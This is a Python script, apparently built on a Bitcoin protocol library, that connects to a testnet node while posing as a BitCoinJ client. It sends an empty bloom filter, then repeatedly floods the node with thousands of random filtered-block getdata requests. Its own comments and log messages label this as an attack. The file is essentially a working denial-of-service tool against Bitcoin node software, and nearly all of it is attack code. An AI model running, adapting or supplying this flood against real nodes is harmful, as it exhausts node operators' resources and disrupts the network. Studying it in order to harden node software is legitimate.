#!/usr/bin/python

from __future__ import print_function

import cStringIO
import bitcoin.coredefs
import time
import hashlib
import struct
import logging
import socket
import random
import socks
import sys
import select

from bitcoin.messages import *
from binascii import hexlify,unhexlify

new_addrs = set()
all_addrs = set()

class NodeConn(object):
    def __init__(self, addr, log, netmagic=None, sub_version='/pynode/'):
        if netmagic is None:
            netmagic = bitcoin.coredefs.NETWORKS['testnet3']

        self.log = log
        self.addr = addr

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setblocking(0)

        try:
            self.sock.connect(addr)
        except socket.error as err:
            if err.errno != 115:
                raise err

        self.ver_send = bitcoin.coredefs.PROTO_VERSION
        self.ver_recv = bitcoin.coredefs.PROTO_VERSION
        self.verack_received = False
        self.have_received_addrs = False
        self.last_sent = 0
        self.netmagic = netmagic
        self.recvbuf = b''
        self.sendbuf = b''

        vt = msg_version()
        vt.addrTo.ip = self.addr[0]
        vt.addrTo.port = self.addr[1]
        vt.addrFrom.ip = "0.0.0.0"
        vt.addrFrom.port = 0
        vt.nStartingHeight = 0
        vt.strSubVer = sub_version
        vt.nServices = 0

        self.send_message(vt)

        self.next_getaddr = -1

    def _run(self):
        try:
            bytes_sent = self.sock.send(self.sendbuf)
            self.sendbuf = self.sendbuf[bytes_sent:]

            if bytes_sent > 0:
                self.last_sent = time.time()

        except IOError as err:
            if err.errno != 11:
                raise err

        try:
            buf = self.sock.recv(8192)
        except IOError as err:
            if err.errno != 11:
                raise err
            else:
                return

        self.recvbuf += buf
        self.got_data()

    def got_data(self):
        while True:
            if len(self.recvbuf) < 4:
                return
            if self.recvbuf[:4] != self.netmagic.msg_start:
                raise ValueError("got garbage %s" % repr(self.recvbuf))
            # check checksum
            if len(self.recvbuf) < 4 + 12 + 4 + 4:
                return
            command = self.recvbuf[4:4+12].split("\x00", 1)[0]
            msglen = struct.unpack("<i", self.recvbuf[4+12:4+12+4])[0]
            checksum = self.recvbuf[4+12+4:4+12+4+4]
            if len(self.recvbuf) < 4 + 12 + 4 + 4 + msglen:
                return
            msg = self.recvbuf[4+12+4+4:4+12+4+4+msglen]
            th = hashlib.sha256(msg).digest()
            h = hashlib.sha256(th).digest()
            if checksum != h[:4]:
                raise ValueError("got bad checksum %s" % repr(self.recvbuf))
            self.recvbuf = self.recvbuf[4+12+4+4+msglen:]

            if command in messagemap:
                f = cStringIO.StringIO(msg)
                t = messagemap[command](self.ver_recv)
                t.deserialize(f)
                self.got_message(t)
            else:
                #self.log.warn("UNKNOWN COMMAND %s %s" % (command, repr(msg)))
                pass

    def got_message(self, msg):
        self.log.info("got message %s" % repr(msg.command))

        if msg.command == 'addr':
            for addr in msg.addrs:
                if addr.ip not in all_addrs:
                    pass
                    #new_addrs.add(addr.ip)
            self.next_getaddr = time.time() + 600
            self.have_received_addrs = True

            self.send_message(msg_filterload())

        elif msg.command == 'verack':
            self.verack_received = True
            peer.next_getaddr = 0

        elif msg.command == 'ping':
            self.send_message(msg_pong(self.ver_send))


    def send_message(self, msg):
        self.sendbuf += message_to_str(self.netmagic, msg)


def deser_uint256b(f):
    r = 0L
    f = f[::-1]
    for i in xrange(8):
        t = struct.unpack("<I", f[i*4:i*4 + 4])[0]
        r += t << (i * 32)
    return r

blkhashes = [deser_uint256b(unhexlify(l.strip())) for l in open('block-hashes','r').readlines()]

logging.basicConfig(level=logging.DEBUG)

#socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, 'localhost', 9050)
#socket.socket = socks.socksocket

new_addrs.add(sys.argv[1])

peers_by_fd = {}

last_info = time.time()
last_attack_round = 0
while True:
    rdy2read, rdy2write, in_error = select.select(
                                        peers_by_fd.keys(),
                                        peers_by_fd.keys(),
                                        (),
                                        1)

    rdy_fds = rdy2read + rdy2write

    if time.time() > last_info + 1:
        logging.info('Attacking %d peers, %d addresses known, %d new' % \
                (len(peers_by_fd), len(all_addrs), len(new_addrs)))
        last_info = time.time()

    rdy_fds = list(rdy_fds)
    random.shuffle(rdy_fds)
    for fd in rdy_fds:
        try:
            peer = peers_by_fd[fd]
        except KeyError:
            continue

        try:
            peer._run()
        except Exception as err:
            logging.info('Peer %s failed: %r, removing' % (peer.addr, err))
            del peers_by_fd[fd]
            all_addrs.discard(peer.addr[0])
            continue

        if not peer.verack_received:
            continue

        if peer.next_getaddr < time.time():
            peer.send_message(msg_getaddr())
            peer.next_getaddr = time.time() + 15

        # attack! send about 100invs/second
        if len(peer.sendbuf) < 5000 and time.time() > peer.attack_delay and peer.have_received_addrs:
            n = 1000
            logging.debug('Sending %d invs to peer %s' % (n, peer.addr[0]))
            for i in range(0, n):
                inv = CInv()
                inv.type = MSG_FILTERED_BLOCK
                inv.hash = random.choice(blkhashes)
                msg = msg_getdata()
                msg.inv.append(inv)
                peer.send_message(msg)

            peer.attack_delay = time.time() + 0.1

    # open some new connections
    if len(peers_by_fd) < 1:
        for i in range(0, 10):
            if not new_addrs:
                break

            new_addr = new_addrs.pop()
            try:
                peer = NodeConn((new_addr, 18333), logging, sub_version='/BitCoinJ:0.10.1/')
            except IOError as err:
                logging.warn('Failed to connect to %s: %r' % (new_addr, err))
                continue

            peer.attack_delay = time.time() + 10

            peers_by_fd[peer.sock.fileno()] = peer

            logging.info('added peer %s' % new_addr)
            all_addrs.add(new_addr)
